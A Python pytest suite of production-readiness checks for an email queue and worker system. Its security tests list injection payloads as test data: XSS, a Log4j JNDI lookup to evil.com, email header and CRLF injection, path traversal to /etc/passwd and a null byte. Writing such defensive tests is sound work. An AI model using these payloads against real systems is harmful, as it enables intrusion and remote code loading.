"""
Production Readiness Tests for Email System

These tests validate that the email system is ready for production deployment,
including security, configuration, monitoring, and operational requirements.
"""
import pytest
import asyncio
import os
import json
import time
from typing import Dict, Any, List, Optional
from unittest.mock import AsyncMock, patch, Mock
from datetime import datetime, timedelta, UTC

from sqlalchemy.ext.asyncio import AsyncSession

from app.core.config import Settings, get_settings
from app.core.queue import EmailQueue, EmailQueueItem
from app.worker.email_worker import EmailWorker
from app.models.email_tracking import EmailTracking, EmailStatus
from app.crud.email_tracking import email_tracking


pytestmark = pytest.mark.asyncio


class TestSecurityReadiness:
    """Test security requirements for production deployment."""

    def test_email_content_sanitization(self):
        """Test that email content is properly sanitized."""
        # Test potentially dangerous content
        dangerous_contents = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "<iframe src='http://malicious.com'></iframe>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com}",  # Log4j style injection
        ]
        
        for dangerous_content in dangerous_contents:
            email_item = EmailQueueItem(
                email_to="security-test@example.com",
                subject=f"Security Test: {dangerous_content}",
                template_name="test",
                template_data={"user_content": dangerous_content}
            )
            
            # Verify email item creation doesn't execute dangerous content
            assert email_item.template_data["user_content"] == dangerous_content
            
            # In production, template rendering should sanitize this content
            # This test validates the data structure, actual sanitization
            # would be tested in template rendering tests

    def test_email_address_validation(self):
        """Test email address validation for security."""
        invalid_emails = [
            "admin@evil.com\nBcc: victim@company.com",  # Header injection
            "test@domain.com<script>alert('xss')</script>",  # XSS attempt
            "../../../etc/passwd",  # Path traversal
            "test@domain.com\r\nTo: victim@company.com",  # CRLF injection
            "test@domain.com\x00admin@evil.com",  # Null byte injection
        ]
        
        for invalid_email in invalid_emails:
            email_item = EmailQueueItem(
                email_to=invalid_email,
                subject="Security Test",
                template_name="test",
                template_data={}
            )
            
            # Email item should store the raw input
            assert email_item.email_to == invalid_email
            
            # Production email sending should validate/sanitize these
            # before actual sending

    def test_template_data_validation(self):
        """Test template data validation for security."""
        # Test large payloads (potential DoS)
        large_data = {"large_field": "x" * (1024 * 1024)}  # 1MB
        
        email_item = EmailQueueItem(
            email_to="dos-test@example.com",
            subject="DoS Test",
            template_name="test",
            template_data=large_data
        )
        
        # Should handle large data without crashing
        assert len(email_item.template_data["large_field"]) == 1024 * 1024
        
        # Test deeply nested objects (potential stack overflow)
        nested_data = {"level1": {"level2": {"level3": {"level4": "deep"}}}}
        
        email_item_nested = EmailQueueItem(
            email_to="nested-test@example.com",
            subject="Nested Test",
            template_name="test",
            template_data=nested_data
        )
        
        # Should handle nested data
        assert email_item_nested.template_data["level1"]["level2"]["level3"]["level4"] == "deep"

    async def test_webhook_signature_validation_security(self):
        """Test webhook signature validation security."""
        from app.schemas.webhooks import WebhookSignatureValidator
        
        # Test replay attack protection
        payload = b'{"test": "data", "timestamp": "' + str(int(time.time())).encode() + b'"}'
        secret = "test_secret_key"
        
        import hmac
        import hashlib
        
        # Valid signature
        valid_signature = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        # Test valid signature
        assert WebhookSignatureValidator.validate_hmac_signature(
            payload=payload,
            signature=valid_signature,
            secret=secret,
            algorithm="sha256"
        ) is True
        
        # Test signature tampering
        tampered_signature = valid_signature[:-2] + "00"
        assert WebhookSignatureValidator.validate_hmac_signature(
            payload=payload,
            signature=tampered_signature,
            secret=secret,
            algorithm="sha256"
        ) is False
        
        # Test payload tampering
        tampered_payload = payload[:-1] + b'x'
        assert WebhookSignatureValidator.validate_hmac_signature(
            payload=tampered_payload,
            signature=valid_signature,
            secret=secret,
            algorithm="sha256"
        ) is False

    def test_configuration_security_validation(self):
        """Test security aspects of configuration."""
        settings = get_settings()
        
        # Test that sensitive configurations are not exposed
        sensitive_fields = [
            'secret_key',
            'smtp_password',
            'database_url',
            'redis_url'
        ]
        
        for field in sensitive_fields:
            if hasattr(settings, field):
                value = getattr(settings, field)
                if value:
                    # Should not contain obvious test/default values in production
                    assert value not in ["test", "password", "123456", "admin", "changeme"]
                    # Should be non-empty for required fields
                    assert len(str(value)) > 0

    async def test_rate_limiting_enforcement(self):
        """Test rate limiting enforcement for security."""
        # This would test actual rate limiting implementation
        # For now, we validate the structure exists
        
        from app.crud.password_reset_token import has_recent_token
        
        # Test rate limiting function exists and has expected signature
        assert callable(has_recent_token)
        
        # In production, this would test:
        # - Rate limits are enforced per IP
        # - Rate limits are enforced per user
        # - Rate limits reset appropriately
        # - Rate limiting doesn't affect legitimate users


class TestConfigurationReadiness:
    """Test configuration requirements for production."""

    def test_required_environment_variables(self):
        """Test that all required environment variables are set."""
        settings = get_settings()
        
        # Critical configuration fields that must be set for production
        required_fields = [
            'secret_key',
            'database_url',
            'redis_url'
        ]
        
        for field in required_fields:
            if hasattr(settings, field):
                value = getattr(settings, field)
                assert value is not None, f"Required field {field} is not set"
                assert len(str(value)) > 0, f"Required field {field} is empty"

    def test_email_provider_configuration(self):
        """Test email provider configuration."""
        settings = get_settings()
        
        # Email configuration validation
        if hasattr(settings, 'smtp_server'):
            assert settings.smtp_server is not None, "SMTP server must be configured"
        
        if hasattr(settings, 'smtp_port'):
            assert isinstance(settings.smtp_port, int), "SMTP port must be an integer"
            assert 1 <= settings.smtp_port <= 65535, "SMTP port must be valid"
        
        if hasattr(settings, 'smtp_username'):
            if settings.smtp_username:
                assert len(settings.smtp_username) > 0, "SMTP username cannot be empty"

    def test_security_configuration(self):
        """Test security-related configuration."""
        settings = get_settings()
        
        # Token expiration validation
        if hasattr(settings, 'access_token_expire_minutes'):
            assert settings.access_token_expire_minutes > 0, "Token expiration must be positive"
            assert settings.access_token_expire_minutes <= 1440, "Token expiration should not exceed 24 hours"
        
        # Secret key validation
        if hasattr(settings, 'secret_key'):
            secret_key = str(settings.secret_key)
            assert len(secret_key) >= 32, "Secret key must be at least 32 characters"
            # Check for sufficient entropy (basic check)
            unique_chars = len(set(secret_key.lower()))
            assert unique_chars >= 10, "Secret key must have sufficient entropy"

    def test_database_configuration_security(self):
        """Test database configuration security."""
        settings = get_settings()
        
        if hasattr(settings, 'database_url'):
            db_url = str(settings.database_url)
            
            # Should use SSL in production
            if "postgresql" in db_url.lower() and "localhost" not in db_url.lower():
                assert "sslmode=" in db_url.lower() or "ssl=true" in db_url.lower(), \
                    "Database connection should use SSL in production"
            
            # Should not use default passwords
            assert "password123" not in db_url.lower(), "Should not use default passwords"
            assert "admin:admin" not in db_url.lower(), "Should not use default credentials"

    def test_redis_configuration_security(self):
        """Test Redis configuration security."""
        settings = get_settings()
        
        if hasattr(settings, 'redis_url'):
            redis_url = str(settings.redis_url)
            
            # Should not use default Redis configuration
            if "localhost" not in redis_url.lower():
                # Production Redis should have authentication
                assert "@" in redis_url or "password=" in redis_url.lower(), \
                    "Production Redis should require authentication"

    async def test_logging_configuration(self):
        """Test logging configuration for production."""
        import logging
        
        # Verify logging is configured
        logger = logging.getLogger("app")
        
        # Should have handlers configured
        assert len(logger.handlers) > 0 or len(logging.root.handlers) > 0, \
            "Logging handlers should be configured"
        
        # Test that logging works
        logger.info("Production readiness test log message")
        
        # Verify log levels are appropriate for production
        effective_level = logger.getEffectiveLevel()
        assert effective_level <= logging.INFO, \
            "Log level should be INFO or higher for production monitoring"


class TestMonitoringReadiness:
    """Test monitoring and observability requirements."""

    async def test_health_check_endpoints_functionality(self, client: AsyncClient):
        """Test that health check endpoints work correctly."""
        # Test basic health endpoint
        response = await client.get("/health")
        
        if response.status_code == 200:
            # If health endpoint exists, validate response structure
            data = response.json()
            assert "status" in data, "Health check should include status"
            assert data["status"] in ["healthy", "ok"], "Health status should be positive"
            
            # Should include timestamp for monitoring
            assert "timestamp" in data or "time" in data, \
                "Health check should include timestamp"

    async def test_metrics_collection_capability(self):
        """Test metrics collection capability."""
        from app.core.metrics import MetricsCollector
        
        # Verify metrics collector exists and is functional
        collector = MetricsCollector()
        
        # Test metric recording
        test_metric = "email_system.test_metric"
        test_value = 42.0
        
        collector.increment_counter(test_metric)
        collector.record_histogram(test_metric, test_value)
        
        # Verify metrics are stored/tracked
        # In production, this would verify integration with monitoring systems

    async def test_error_tracking_capability(self):
        """Test error tracking and alerting capability."""
        import logging
        
        # Test error logging
        logger = logging.getLogger("app.email_system")
        
        # Simulate error logging
        test_error = Exception("Test error for monitoring validation")
        logger.error("Production readiness test error", exc_info=test_error)
        
        # In production, verify this integrates with error tracking systems
        # (Sentry, DataDog, CloudWatch, etc.)

    async def test_performance_monitoring_capability(self):
        """Test performance monitoring capability."""
        # Test timing measurement capability
        start_time = time.time()
        
        # Simulate some work
        await asyncio.sleep(0.01)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Verify timing measurement works
        assert duration > 0, "Performance timing should work"
        assert 0.005 < duration < 0.1, "Timing should be reasonably accurate"
        
        # In production, verify integration with APM tools


class TestScalabilityReadiness:
    """Test system scalability requirements."""

    async def test_database_connection_pooling(self):
        """Test database connection pooling configuration."""
        from app.db.session import get_session
        
        # Test that connection pooling is configured
        # This would validate SQLAlchemy pool configuration
        
        # Test basic database connectivity
        async with get_session() as session:
            # Simple query to verify connection works
            result = await session.execute("SELECT 1 as test")
            row = result.fetchone()
            assert row[0] == 1, "Database connection should work"

    async def test_redis_connection_pooling(self):
        """Test Redis connection pooling."""
        from app.core.redis import get_redis_client
        
        # Test Redis connectivity
        redis_client = await get_redis_client()
        
        if redis_client:
            # Test basic Redis operation
            await redis_client.set("production_test_key", "test_value", ex=60)
            value = await redis_client.get("production_test_key")
            assert value == "test_value", "Redis connection should work"
            
            # Cleanup
            await redis_client.delete("production_test_key")

    async def test_concurrent_request_handling(self):
        """Test system's ability to handle concurrent requests."""
        # Simulate concurrent operations
        num_concurrent = 10
        tasks = []
        
        async def simulate_email_operation(task_id: int):
            """Simulate an email-related operation."""
            start_time = time.time()
            
            # Simulate work
            await asyncio.sleep(0.01)
            
            end_time = time.time()
            return {
                "task_id": task_id,
                "duration": end_time - start_time,
                "success": True
            }
        
        # Create concurrent tasks
        for i in range(num_concurrent):
            tasks.append(simulate_email_operation(i))
        
        # Execute concurrently
        results = await asyncio.gather(*tasks)
        
        # Verify all tasks completed successfully
        assert len(results) == num_concurrent
        assert all(result["success"] for result in results)
        
        # Verify reasonable performance under concurrency
        max_duration = max(result["duration"] for result in results)
        assert max_duration < 0.1, "Concurrent operations should complete reasonably quickly"

    async def test_memory_usage_efficiency(self):
        """Test memory usage efficiency."""
        import gc
        import psutil
        import os
        
        # Get initial memory usage
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Simulate email processing operations
        mock_queue = AsyncMock()
        processed_items = []
        
        for i in range(100):
            email_item = EmailQueueItem(
                email_to=f"memory-test-{i}@example.com",
                subject=f"Memory Test {i}",
                template_name="test",
                template_data={"index": i, "data": "test data"}
            )
            processed_items.append(email_item)
        
        # Force garbage collection
        gc.collect()
        
        # Get final memory usage
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_growth = final_memory - initial_memory
        
        # Verify memory usage is reasonable
        assert memory_growth < 50, f"Memory growth should be < 50MB, was {memory_growth:.1f}MB"


class TestDataIntegrityReadiness:
    """Test data integrity and consistency requirements."""

    async def test_database_transaction_integrity(self, db: AsyncSession):
        """Test database transaction integrity."""
        from app.schemas.email_tracking import EmailTrackingCreate
        
        # Test transaction rollback on failure
        tracking_data = EmailTrackingCreate(
            email_id="integrity-test-123",
            recipient="integrity@example.com",
            subject="Integrity Test",
            template_name="test",
            status=EmailStatus.QUEUED
        )
        
        try:
            # Start transaction
            tracking = await email_tracking.create_with_event(
                db=db,
                obj_in=tracking_data,
                event_type=EmailStatus.QUEUED
            )
            
            # Verify creation
            assert tracking is not None
            assert tracking.email_id == "integrity-test-123"
            
            # Test rollback
            await db.rollback()
            
            # Verify record was not persisted
            from sqlalchemy import select
            from app.models.email_tracking import EmailTracking
            
            result = await db.execute(
                select(EmailTracking).where(
                    EmailTracking.email_id == "integrity-test-123"
                )
            )
            records = result.fetchall()
            assert len(records) == 0, "Rolled back transaction should not persist data"
            
        except Exception:
            await db.rollback()
            raise

    async def test_data_validation_integrity(self):
        """Test data validation integrity."""
        from app.schemas.email_tracking import EmailTrackingCreate
        from pydantic import ValidationError
        
        # Test required field validation
        with pytest.raises(ValidationError):
            EmailTrackingCreate(
                # Missing required fields
                recipient="test@example.com"
            )
        
        # Test email validation
        with pytest.raises(ValidationError):
            EmailTrackingCreate(
                email_id="test-123",
                recipient="invalid-email",  # Invalid email format
                subject="Test",
                template_name="test",
                status=EmailStatus.QUEUED
            )
        
        # Test enum validation
        with pytest.raises(ValidationError):
            EmailTrackingCreate(
                email_id="test-123",
                recipient="test@example.com",
                subject="Test",
                template_name="test",
                status="INVALID_STATUS"  # Invalid status
            )

    async def test_concurrent_data_modification_safety(self, db: AsyncSession):
        """Test safety of concurrent data modifications."""
        from app.schemas.email_tracking import EmailTrackingCreate
        
        # Create base tracking record
        tracking_data = EmailTrackingCreate(
            email_id="concurrent-mod-123",
            recipient="concurrent@example.com",
            subject="Concurrent Test",
            template_name="test",
            status=EmailStatus.SENT
        )
        
        tracking = await email_tracking.create_with_event(
            db=db,
            obj_in=tracking_data,
            event_type=EmailStatus.SENT
        )
        await db.commit()
        
        try:
            # Simulate concurrent modifications
            async def update_to_delivered():
                return await email_tracking.update_status(
                    db=db,
                    db_obj=tracking,
                    status=EmailStatus.DELIVERED
                )
            
            async def update_to_opened():
                return await email_tracking.update_status(
                    db=db,
                    db_obj=tracking,
                    status=EmailStatus.OPENED
                )
            
            # Execute concurrent updates
            results = await asyncio.gather(
                update_to_delivered(),
                update_to_opened(),
                return_exceptions=True
            )
            
            # At least one should succeed
            successful_updates = [r for r in results if not isinstance(r, Exception)]
            assert len(successful_updates) > 0, "At least one concurrent update should succeed"
            
            # Verify final state is consistent
            await db.refresh(tracking)
            assert tracking.status in [EmailStatus.DELIVERED, EmailStatus.OPENED], \
                "Final status should be one of the attempted updates"
            
        finally:
            # Cleanup
            await db.delete(tracking)
            await db.commit()


class TestRecoveryReadiness:
    """Test system recovery and resilience requirements."""

    async def test_graceful_shutdown_capability(self):
        """Test graceful shutdown of email system components."""
        mock_queue = AsyncMock()
        mock_queue.dequeue.return_value = (None, None)  # Empty queue
        
        worker = EmailWorker(queue=mock_queue)
        
        # Start worker
        worker.start()
        assert worker.is_running, "Worker should start successfully"
        
        # Let it run briefly
        await asyncio.sleep(0.1)
        
        # Test graceful shutdown
        worker.stop()
        assert not worker.is_running, "Worker should stop gracefully"
        
        # Verify task is cancelled
        await asyncio.sleep(0.1)
        if worker.processing_task:
            assert worker.processing_task.cancelled(), "Processing task should be cancelled"

    async def test_error_recovery_capability(self):
        """Test system recovery from errors."""
        mock_queue = AsyncMock()
        
        # Setup queue to fail then recover
        call_count = [0]
        
        def mock_dequeue_with_recovery():
            call_count[0] += 1
            if call_count[0] <= 2:
                # First two calls fail
                raise Exception("Temporary failure")
            else:
                # Third call succeeds
                return ("recovery_test", EmailQueueItem(
                    email_to="recovery@example.com",
                    subject="Recovery Test",
                    template_name="test",
                    template_data={}
                ))
        
        mock_queue.dequeue = mock_dequeue_with_recovery
        
        worker = EmailWorker(queue=mock_queue)
        
        # Test error recovery
        with patch('app.worker.email_worker.send_email', new_callable=AsyncMock):
            # First attempt - should fail
            result1 = await worker.process_one()
            assert result1 is False, "First attempt should fail"
            
            # Second attempt - should fail
            result2 = await worker.process_one()
            assert result2 is False, "Second attempt should fail"
            
            # Third attempt - should succeed (recovered)
            result3 = await worker.process_one()
            assert result3 is True, "Third attempt should succeed after recovery"

    async def test_data_backup_capability(self, db: AsyncSession):
        """Test data backup and recovery capability."""
        from app.schemas.email_tracking import EmailTrackingCreate
        
        # Create test data
        tracking_data = EmailTrackingCreate(
            email_id="backup-test-123",
            recipient="backup@example.com",
            subject="Backup Test",
            template_name="test",
            status=EmailStatus.SENT
        )
        
        tracking = await email_tracking.create_with_event(
            db=db,
            obj_in=tracking_data,
            event_type=EmailStatus.SENT
        )
        await db.commit()
        
        try:
            # Verify data exists
            from sqlalchemy import select
            from app.models.email_tracking import EmailTracking
            
            result = await db.execute(
                select(EmailTracking).where(
                    EmailTracking.email_id == "backup-test-123"
                )
            )
            records = result.fetchall()
            assert len(records) == 1, "Test data should exist"
            
            # In production, this would test:
            # - Database backup procedures
            # - Point-in-time recovery
            # - Data export/import capabilities
            
        finally:
            # Cleanup
            await db.delete(tracking)
            await db.commit()


class TestComplianceReadiness:
    """Test compliance and regulatory requirements."""

    def test_data_retention_policy_compliance(self):
        """Test data retention policy compliance."""
        # Test that email tracking includes necessary fields for compliance
        from app.models.email_tracking import EmailTracking
        
        # Verify required fields exist for audit trail
        required_fields = [
            'created_at',     # When record was created
            'updated_at',     # When record was last modified
            'recipient',      # Who received the email
            'status',         # Current status
        ]
        
        for field in required_fields:
            assert hasattr(EmailTracking, field), \
                f"EmailTracking should have {field} field for compliance"

    def test_audit_trail_capability(self):
        """Test audit trail capability."""
        from app.models.email_tracking import EmailEvent
        
        # Verify audit trail fields exist
        audit_fields = [
            'occurred_at',     # When event occurred
            'event_type',      # What happened
            'event_metadata',  # Additional context
        ]
        
        for field in audit_fields:
            assert hasattr(EmailEvent, field), \
                f"EmailEvent should have {field} field for audit trail"

    def test_privacy_compliance_capability(self):
        """Test privacy compliance capability (GDPR, CCPA, etc.)."""
        from app.crud.email_tracking import email_tracking
        
        # Verify data deletion capability exists
        assert hasattr(email_tracking, 'remove') or hasattr(email_tracking, 'delete'), \
            "Should have capability to delete user data for privacy compliance"
        
        # Test data anonymization capability
        # In production, this would test:
        # - PII removal procedures
        # - Data anonymization
        # - Right to be forgotten implementation

    def test_encryption_compliance(self):
        """Test encryption compliance for data at rest and in transit."""
        from app.core.config import get_settings
        
        settings = get_settings()
        
        # Verify database connection uses encryption
        if hasattr(settings, 'database_url'):
            db_url = str(settings.database_url)
            if "localhost" not in db_url.lower():
                # Production database should use SSL
                assert any(param in db_url.lower() for param in ['ssl=true', 'sslmode=require', 'sslmode=prefer']), \
                    "Production database connection should use SSL encryption"
        
        # Verify Redis connection uses encryption (if applicable)
        if hasattr(settings, 'redis_url'):
            redis_url = str(settings.redis_url)
            if "localhost" not in redis_url.lower():
                # Production Redis may use TLS
                if "rediss://" in redis_url.lower() or "tls" in redis_url.lower():
                    assert True, "Redis uses TLS encryption"